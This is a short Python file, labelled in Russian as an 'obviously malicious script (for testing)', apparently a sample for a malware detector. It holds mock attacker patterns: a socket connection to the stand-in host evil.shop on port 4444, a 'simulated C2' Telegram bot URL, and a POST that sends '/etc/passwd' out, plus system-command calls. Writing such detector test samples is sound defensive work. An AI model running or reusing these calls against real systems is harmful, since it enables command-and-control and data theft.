# Явно вредоносный скрипт (для тестирования)
import os
import subprocess
import socket
import ctypes
import requests

# Simulated C2
API_URL = "https://api.telegram.org/bot123456/sendMessage"

def execute_system_cmd():
    os.system("whoami")
    subprocess.Popen(["ls", "-la"])
    
def network_activity():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.shop", 4444))
    
def load_library():
    lib = ctypes.CDLL("libc.so.6")
    
def exfiltrate():
    requests.post(API_URL, data={"chat_id": "123", "text": "/etc/passwd"})
    
if __name__ == "__main__":
    execute_system_cmd()
